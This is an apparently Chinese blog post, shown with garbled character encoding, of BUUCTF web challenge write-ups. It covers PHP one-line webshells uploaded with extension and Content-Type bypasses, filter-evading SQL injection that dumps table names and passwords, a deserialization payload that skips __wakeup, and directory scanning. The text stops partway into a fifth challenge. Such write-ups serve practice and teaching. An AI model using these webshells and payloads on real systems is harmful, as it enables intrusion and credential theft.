<!doctype html>
<html lang="zh"><head>
<title>BUUCTFç¯‡-Webéƒ¨åˆ†é¢˜è§£ - æ‚è®°</title>
<meta charset="UTF-8">
<meta name="keywords" content="CTF,web,github">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">

<link rel="shortcut icon" href="/images/icon.png" type="image/png" />
<meta name="description" content="BUUCTFç¯‡Web1ã€ [æå®¢å¤§æŒ‘æˆ˜ 2019]Upload1ä¸€å¥è¯ ä¸Šä¼ shell.phpæ–‡ä»¶ æ–‡ä»¶å†…å®¹ä¸º åˆ™è¿æ¥å¯†ç ä¸º123 1&lt;?php @eval($_POST[&#x27;123&#x27;])?&gt;  1GIF89a? &lt;script language&#x3D;&quot;php&quot;&gt;eval($_REQUEST[123])&lt;&#x2F;script&gt;  é¡µé¢">
<meta property="og:type" content="article">
<meta property="og:title" content="BUUCTFç¯‡-Webéƒ¨åˆ†é¢˜è§£">
<meta property="og:url" content="http://xxxkkk578.github.io/2024/04/09/buu_web/index.html">
<meta property="og:site_name" content="æ‚è®°">
<meta property="og:description" content="BUUCTFç¯‡Web1ã€ [æå®¢å¤§æŒ‘æˆ˜ 2019]Upload1ä¸€å¥è¯ ä¸Šä¼ shell.phpæ–‡ä»¶ æ–‡ä»¶å†…å®¹ä¸º åˆ™è¿æ¥å¯†ç ä¸º123 1&lt;?php @eval($_POST[&#x27;123&#x27;])?&gt;  1GIF89a? &lt;script language&#x3D;&quot;php&quot;&gt;eval($_REQUEST[123])&lt;&#x2F;script&gt;  é¡µé¢">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2024-04-09T15:09:33.000Z">
<meta property="article:modified_time" content="2024-04-10T11:15:36.057Z">
<meta property="article:author" content="å¥½çš„">
<meta property="article:tag" content="CTF,Web">
<meta name="twitter:card" content="summary">

<link rel="stylesheet" href="/lib/fancybox/fancybox.css">
<link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">


<link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1721993444688">

<link rel="stylesheet" href="/css/style.css?v=1721993444688">




    
        <link rel="stylesheet" href="/custom.css?v=1721993444688">
    



<script src="/lib/mdui_043tiny/mdui.js" async></script>
<script src="/lib/fancybox/fancybox.umd.js" async></script>
<script src="/lib/lax.min.js" async></script>


<script async src="/js/app.js?v=1721993444688"></script>

 

<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-4D4ZJ9G024"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag("js", new Date());

  gtag("config", "G-4D4ZJ9G024");
</script>


<link rel="stylesheet"  href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/atom-one-dark.min.css">
<meta name="generator" content="Hexo 7.1.1"></head><body class="nexmoe mdui-drawer-body-left"><div id="nexmoe-background"><div class="nexmoe-bg" style="background-image: url(https://i.pinimg.com/474x/d5/20/a8/d520a8a9e2919f9beb22a2b31662df68.jpg)"></div><div class="mdui-appbar mdui-shadow-0"><div class="mdui-toolbar"><a class="mdui-btn mdui-btn-icon mdui-ripple" mdui-drawer="{target: &#039;#drawer&#039;, swipe: true}" title="menu"><i class="mdui-icon nexmoefont icon-menu"></i></a><div class="mdui-toolbar-spacer"></div><a class="mdui-btn mdui-btn-icon" href="/" title="å¥½çš„"><img src="/images/haode.jpg" alt="å¥½çš„"></a></div></div></div><div id="nexmoe-header"><div class="nexmoe-drawer mdui-drawer" id="drawer">
    <div class="nexmoe-avatar mdui-ripple">
        <a href="/" title="å¥½çš„">
            <img src="/images/haode.jpg" alt="å¥½çš„" alt="å¥½çš„">
        </a>
    </div>
    <div class="nexmoe-count">
        <div><span>æ–‡ç« </span>12</div>
        <div><span>æ ‡ç­¾</span>9</div>
        <div><span>åˆ†ç±»</span>4</div>
    </div>
    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="å›åˆ°é¦–é¡µ">
            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
            <div class="mdui-list-item-content">
                å›åˆ°é¦–é¡µ
            </div>
        </a>
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/archive.html" title="æ–‡ç« åˆ†ç±»">
            <i class="mdui-list-item-icon nexmoefont icon-container"></i>
            <div class="mdui-list-item-content">
                æ–‡ç« åˆ†ç±»
            </div>
        </a>
        
    </div>
    
    
        
        
        
        
        
        
        
  <div class="nexmoe-widget-wrap">
    <h3 class="nexmoe-widget-title">æ–‡ç« å½’æ¡£</h3>
    <div class="nexmoe-widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/">2024</a><span class="archive-list-count">12</span></li></ul>
    </div>
  </div>



    
        
        
   
    <div class="nexmoe-copyright">
        &copy; 2024 å¥½çš„
        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
        
    </div>
</div><!-- .nexmoe-drawer --></div><div id="nexmoe-content"><div class="nexmoe-primary"><div class="nexmoe-post">
  <article>
    
        <div class="nexmoe-post-cover absolute" style="padding-top: 50%;"> 
            <img src="/images/02.jpg" alt="BUUCTFç¯‡-Webéƒ¨åˆ†é¢˜è§£" loading="lazy">
            <h1>BUUCTFç¯‡-Webéƒ¨åˆ†é¢˜è§£</h1>
        </div>
    
    
    <div class="nexmoe-post-meta">
    <div class="nexmoe-rainbow">
        <a class="nexmoefont icon-calendar-fill">2024å¹´04æœˆ09æ—¥</a>
        
            <a class="nexmoefont icon-appstore-fill -link" href="/categories/CTF/">CTF</a>
        
        
    </div>
    
    
    
    
    
</div>

    <h1 id="BUUCTFç¯‡"><a href="#BUUCTFç¯‡" class="headerlink" title="BUUCTFç¯‡"></a>BUUCTFç¯‡</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="1ã€-æå®¢å¤§æŒ‘æˆ˜-2019-Upload1"><a href="#1ã€-æå®¢å¤§æŒ‘æˆ˜-2019-Upload1" class="headerlink" title="1ã€ [æå®¢å¤§æŒ‘æˆ˜ 2019]Upload1"></a>1ã€ [æå®¢å¤§æŒ‘æˆ˜ 2019]Upload1</h3><p>ä¸€å¥è¯</p>
<p>ä¸Šä¼ shell.phpæ–‡ä»¶ æ–‡ä»¶å†…å®¹ä¸º åˆ™è¿æ¥å¯†ç ä¸º123</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;?php @eval($_POST[&#x27;123&#x27;])?&gt;<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">GIF89a? &lt;script language=&quot;php&quot;&gt;eval($_REQUEST[123])&lt;/script&gt;<br></code></pre></td></tr></table></figure>

<p>é¡µé¢è¿”è¿˜</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Not image!<br></code></pre></td></tr></table></figure>

<p>ä½¿ç”¨burpæŠ“åŒ…ä¿®æ”¹æ–‡ä»¶ç±»å‹å³å¯ ä¿®æ”¹å†…å®¹ä¸º</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Content-type:image/jpg<br></code></pre></td></tr></table></figure>

<p>é¡µé¢è¿”è¿˜</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">not phpï¼<br></code></pre></td></tr></table></figure>

<p>åˆ™è¯´æ˜åç¼€ä¸ºphpæ˜¯ä¸è¡Œçš„ å› æ­¤éœ€è¦å…¶ä»–åç¼€è¿›è¡Œç»•è¿‡</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">phtmlã€phtã€phpã€php3ã€php4ã€php5<br></code></pre></td></tr></table></figure>

<p>ä¸Šä¼ æˆåŠŸ</p>
<p>ä¹‹åéœ€è¦ç‚¹å‡»è¯¥æ–‡ä»¶æ‰èƒ½äº§ç”Ÿè¿æ¥</p>
<p>éœ€è¦è®¿é—®uploadç›®å½•</p>
<p>å†ç”¨èšå‰‘æˆ–èœåˆ€è¿æ¥å³å¯</p>
<h3 id="2ã€-ACTF2020-æ–°ç”Ÿèµ›-Upload"><a href="#2ã€-ACTF2020-æ–°ç”Ÿèµ›-Upload" class="headerlink" title="2ã€ [ACTF2020 æ–°ç”Ÿèµ›]Upload"></a>2ã€ [ACTF2020 æ–°ç”Ÿèµ›]Upload</h3><p>é¦–å…ˆä¸Šç©¿æœ€åŸºæœ¬çš„ä¸€å¥è¯php å¹¶ä¸”ç›´æ¥ç”¨phtmlä½œä¸ºæ–‡ä»¶åç¼€</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">è¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ jpgã€pngã€gifç»“å°¾çš„å›¾ç‰‡å™¢ï¼<br></code></pre></td></tr></table></figure>

<p>åˆ™ç±»ä¼¼ä¸Šé¢˜ burpæŠ“åŒ…åä¿®æ”¹æ–‡ä»¶ç±»å‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">å˜¿ä¼™è®¡ï¼Œä½ å‘ç°å®ƒäº†ï¼ æœªé€‰æ‹©ä»»ä½•æ–‡ä»¶ <br>Upload Success! Look here~ ./uplo4d/17a92c8d532f506204d798bc569ce42e.phtml<br></code></pre></td></tr></table></figure>

<p>ç›´æ¥æå®šäº†</p>
<p>æœ€åè¿˜æ˜¯èšå‰‘è¿ä¸€ä¸‹ æ‰¾flag ä¸€èˆ¬éƒ½åœ¨æ ¹ç›®å½•</p>
<h3 id="3ã€-æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL"><a href="#3ã€-æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL" class="headerlink" title="3ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL"></a>3ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL</h3><p>è¿›å»åæ˜¯å…¸å‹çš„è¾“å…¥ç”¨æˆ·åå’Œå¯†ç çš„ç™»å½•æ¡†</p>
<p>æŒ‰å¦‚ä¸‹æ–¹æ³•è¿›è¡Œæµ‹è¯•</p>
<p>å³ä¸æ–­æ›´æ”¹å•å¼•å·çš„ä½ç½® ç„¶åè§‚å¯ŸæŠ¥é”™çš„å†…å®¹</p>
<p>å¦‚åœ¨passwordä¸­è¾“å…¥adminâ€™ å é¡µé¢è¿”å›æŠ¥é”™å†…å®¹ä¸º å…¶ä¸­adminæœ€å¤–å±‚çš„ä¸¤ä¸ªå•å¼•å·æ˜¯æŠ¥é”™ç»™çš„</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">for the right syntax to use near &#x27;&#x27;admin &#x27;&#x27;&#x27;<br></code></pre></td></tr></table></figure>

<p>å› æ­¤å¯ä»¥é€šè¿‡åœ¨passwordæ¡†ä¸­è¾“å…¥å¦‚ä¸‹ä»£ç æ¥è¿›è¡Œæµ‹è¯•</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">admin&#x27; è¯­å¥ #<br></code></pre></td></tr></table></figure>

<p>ç»æµ‹è¯• å‘ç°or, select,where, union å‡è¢«è¿‡æ»¤ åº”è¯¥æ˜¯è¢«replaceå‡½æ•°æ›¿ä»£æˆä¸ºäº†ç©ºå­—ç¬¦</p>
<p>å› </p>
<p>å› æ­¤é‡‡ç”¨è”åˆæŸ¥è¯¢çš„æ–¹å¼</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">admin&#x27; uunionnion sselectelect 1,2%23 #<br></code></pre></td></tr></table></figure>

<p>æŠ¥é”™ åŠ ä¸€åˆ—è¯•è¯•</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">admin &#x27; uunionnion sselectelect 1,2,3%23 #<br></code></pre></td></tr></table></figure>

<p>è¿”å›çš„é¡µé¢ä¸º</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Hello â€˜2â€™<br>Your password is &#x27;3â€™<br></code></pre></td></tr></table></figure>

<p>å› æ­¤æ³¨å…¥çš„ä»£ç ä¸­ 2ï¼Œ3ä¸¤ä¸ªä½ç½®å¯ä»¥ç”¨æ¥æ˜¾ç¤º</p>
<p>ç»§ç»­æŸ¥è¡¨</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">admin&#x27; uunionnion sselectelect 1,2,group_concat(table_name)ffromrom <br>infoorrmation_schema.tables<br>wwherehere table_schema=database() <br> #<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">wwherehere table_schema=database() åŠ ä¸Šåˆ™ä»£è¡¨æŸ¥è¯¢åˆ°çš„æ˜¯ç”¨æˆ·è‡ªå®šä¹‰çš„è¡¨<br></code></pre></td></tr></table></figure>

<p>è¿”å›çš„é¡µé¢ä¸º</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Hello â€˜2â€™<br>Your password is &#x27;b4bsql,geekuserâ€™<br></code></pre></td></tr></table></figure>

<p>çŸ¥é“äº†è¡¨åä¹‹åç»§ç»­æŸ¥è¯¢åˆ—ç›¸å…³çš„ä¿¡æ¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">admin&#x27; UNunionION SEselectLECT 1,2,GROUP_CONCAT(column_name) <br>FfromROM infoorrmation_schema.columns WHwhereERE table_name = &#x27;b4bsql&#x27;#<br></code></pre></td></tr></table></figure>

<p>æŸ¥è¯¢ç»“æœ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ç¬¬ä¸€è¡Œéƒ½ä¸€æ · ä¸å†™äº†<br>Your password is &#x27;id,username,password<br></code></pre></td></tr></table></figure>

<p>æŸ¥è¯¢å¦ä¸€ä¸ªè¡¨</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">admin&#x27; UNunionION SEselectLECT 1,2,GROUP_CONCAT(column_name) <br>FfromROM infoorrmation_schema.columns WHwhereERE table_name = &#x27;geekuser&#x27;#<br></code></pre></td></tr></table></figure>

<p>æŸ¥è¯¢ç»“æœåŒä¸Š</p>
<p>æ¥ä¸‹æ¥ç›´æ¥çˆ†æ•°æ®å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">admin &#x27; UNunionION SEselectLECT 1,2,GROUP_CONCAT(passwoorrd) frfromom b4bsql #<br></code></pre></td></tr></table></figure>

<h3 id="4ã€-æå®¢å¤§æŒ‘æˆ˜-2019-PHP"><a href="#4ã€-æå®¢å¤§æŒ‘æˆ˜-2019-PHP" class="headerlink" title="4ã€ [æå®¢å¤§æŒ‘æˆ˜ 2019]PHP"></a>4ã€ [æå®¢å¤§æŒ‘æˆ˜ 2019]PHP</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">å› ä¸ºæ¯æ¬¡çŒ«çŒ«éƒ½åœ¨æˆ‘é”®ç›˜ä¸Šä¹±è·³ï¼Œæ‰€ä»¥æˆ‘æœ‰ä¸€ä¸ªè‰¯å¥½çš„å¤‡ä»½ç½‘ç«™çš„ä¹ æƒ¯<br></code></pre></td></tr></table></figure>

<p>å’Œå¤‡ä»½ç›¸å…³çš„ åˆ™æ‰«ææ ¹ç›®å½•</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">python dirsearch.py -u https://target <br></code></pre></td></tr></table></figure>

<p>é‡Œé¢æœ‰ä¸ªflag.php ä½†æ˜¯æ˜¯å”¬äººçš„</p>
<p>æ‰“å¼€index.php å‘ç°äº†å’Œåºåˆ—åŒ–ç›¸å…³çš„å†…å®¹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;class.php&#x27;</span>;<br>    <span class="hljs-variable">$select</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;select&#x27;</span>];<br>    <span class="hljs-variable">$res</span>=<span class="hljs-title function_ invoke__">unserialize</span>(@<span class="hljs-variable">$select</span>);<br>    <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>æ‰“å¼€class.phpæºç çœ‹çœ‹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;nonono&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;yesyes&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-string">&#x27;guest&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;password != <span class="hljs-number">100</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You name is: &quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;username;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You password is: &quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;password;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;username === <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;<br>            <span class="hljs-keyword">die</span>();<br><br><br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>åˆ†æå¦‚ä¸‹</p>
<p>é¡ºåºæ‰§è¡Œ åœ¨__wakeupå‡½æ•°ä¸­ usernameå˜ä¸ºguest è¦æƒ³é˜»æ­¢å®ƒå°±è¦è·³è¿‡è¿™ä¸ªå‡½æ•°</p>
<p>åœ¨__destructå‡½æ•°ä¸­ passwordå¿…é¡»ç­‰äº100 å¦åœ¨åœ¨ç¬¬ä¸€ä¸ªåˆ†æ”¯ä¸­dieå°±ç»“æŸäº†</p>
<p>åŒæ—¶usernameå¿…é¡»ç­‰äºadmin</p>
<p>è„šæœ¬</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;nonono&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;yesyes&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Name</span>(<span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-number">100</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>è¿è¡Œè„šæœ¬ä¹‹åå¾—åˆ°çš„ç»“æœ</p>
<p>1ã€åœ¨çº¿phpå³å¯è¿è¡Œ</p>
<p>2ã€æˆ–è€…ç›´æ¥åœ¨phpç›®å½•ä¸‹è¿è¡Œäº¦å¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;<br></code></pre></td></tr></table></figure>

<p>å‰æ–‡æåˆ°è¿‡ éœ€è¦è·³è¿‡__wakeupå‡½æ•° æ¥ä¿è¯usernameä¸ºadminè€Œä¸æ˜¯guest</p>
<p>åˆ™ä¿®æ”¹ä¸ºå°†2ä¿®æ”¹ä¸º3ä¹‹å æ„ä¸ºæœ‰3ä¸ªå‚æ•° è€Œ__wakeupå‡½æ•°åªæ¥å—ä¸¤ä¸ªå‚æ•° æ•…å¯å®ç°è·³è¿‡</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">O:4:&quot;Name&quot;:3:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;<br></code></pre></td></tr></table></figure>

<p>åˆå› ä¸ºusernameå’Œpassword æ˜¯privateå®šä¹‰çš„ æ­¤ç§æœ‰å­—æ®µçš„å­—æ®µååœ¨åºåˆ—åŒ–æ—¶å‰é¢ä¼šåŠ ä¸Š0çš„å‰ç¼€ å³%00 æ•…æœ€ç»ˆçš„æ“ä½œä¸º</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;<br></code></pre></td></tr></table></figure>

<p>æ„é€ ååºåˆ—åŒ–</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">/?select=O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;<br></code></pre></td></tr></table></figure>

<p>å¤åˆ¶åˆ°ç½‘å€åé¢å³å¯</p>
<h3 id="5ã€-ACTF2020-æ–°ç”Ÿèµ›-BackupFile"><a href="#5ã€-ACTF2020-æ–°ç”Ÿèµ›-BackupFile" class="headerlink" title="5ã€[ACTF2020 æ–°ç”Ÿèµ›]BackupFile"></a>5ã€[ACTF2020 æ–°ç”Ÿèµ›]BackupFile</h3><p>ç»æ‰«æç›®å½•åå‘ç°</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">[09:48:36] 200 -    0B  - /flag.php<br>[09:49:30] 200 -  347B  - /index.php.bak<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">index.php.bak<br></code></pre></td></tr></table></figure>

<p>æ‰“å¼€è¯¥æ–‡ä»¶å æŸ¥çœ‹åˆ°æºä»£ç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include_once</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$key</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$key</span>)) &#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;Just num!&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$key</span>);<br>    <span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$key</span> == <span class="hljs-variable">$str</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Try to find out source file!&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

